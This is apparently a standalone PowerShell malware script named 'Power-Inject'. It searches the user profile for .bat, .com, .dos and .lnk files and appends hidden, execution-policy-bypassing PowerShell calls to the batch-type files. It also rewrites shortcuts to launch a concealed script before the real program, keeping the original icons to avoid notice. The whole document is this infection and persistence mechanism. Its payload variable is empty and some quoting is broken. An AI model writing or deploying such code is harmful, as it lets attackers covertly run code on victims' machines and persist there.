$ErrorActionPreference = "SilentlyContinue"
$command = ""
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
function Power-Inject{
    $bat = GCI -Path $env:UserProfile -Filter *.bat -Recurse
    $com = GCI -Path $env:UserProfile -Filter *.com -Recurse
    $dos = GCI -Path $env:UserProfile -Filter *.dos -Recurse
    $lnk = GCI -Path $env:UserProfile -Filter *.lnk -Recurse
    New-Item -Path $env:APPDATA -Type File -Value PI.ps1

    foreach($file in $bat){
        Get-ChildItem -Path $env:HOMEDRIVE -Filter "PI.ps1" -Recurse -OutVariable a | Out-Null
        $start = $a[0].FullName
        powershell -EP ByPass -WindowStyle Hidden -NoLogo -File $start
        Add-Content -Path $file.FullName -Value "powershell.exe -EP ByPass -WindowStyle Hidden -NoProfile -NoLogo -File "$Start""
    }
    foreach($file in $com){
        Get-ChildItem -Path $env:HOMEDRIVE -Filter "PI.ps1" -Recurse -OutVariable a | Out-Null
        $start = $a[0].FullName
        powershell -EP ByPass -WindowStyle Hidden -NoLogo -File $start
        Add-Content -Path $file.FullName -Value "powershell.exe -EP ByPass -WindowStyle Hidden -NoProfile -NoLogo -File "$Start""
    }
    foreach($file in $dos){
        Get-ChildItem -Path $env:HOMEDRIVE -Filter "PI.ps1" -Recurse -OutVariable a | Out-Null
        $start = $a[0].FullName
        powershell -EP ByPass -WindowStyle Hidden -NoLogo -File $start
        Add-Content -Path $file.FullName -Value "powershell.exe -EP ByPass -WindowStyle Hidden -NoProfile -NoLogo -File "$Start""
    }
    foreach($file in $lnk){
        $temp = $file.Name
        Copy-Item -Path $file.FullName -Destination $env:APPDATA -Force
        $WshShell = New-Object -comObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("$env:APPDATA\$temp")
        $SourceExe = $Shortcut.TargetPath
        $Shortcut.TargetPath = "powershell.exe"
        New-Item -Path "$env:APPDATA\$temp.ps1" -Type file -Force | Out-Null
        Add-Content -Path "$env:APPDATA\$temp.ps1" -Value {powershell -EP ByPass -WindowStyle Hidden -NoLogo -File "$env:APPDATA\PI.ps1"}
        Add-Content -Path "$env:APPDATA\$temp.ps1" -Value "start `"$SourceExe`""
        $Script = "$env:APPDATA\$temp.ps1"
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
        $encodedCommand = [Convert]::ToBase64String($bytes)
        $Shortcut.Arguments = "-EP ByPass -WindowStyle Hidden -NoProfile -NoLogo -File `"$Script`""
        $Shortcut.IconLocation = $SourceExe
        $Shortcut.Save()
    }
}
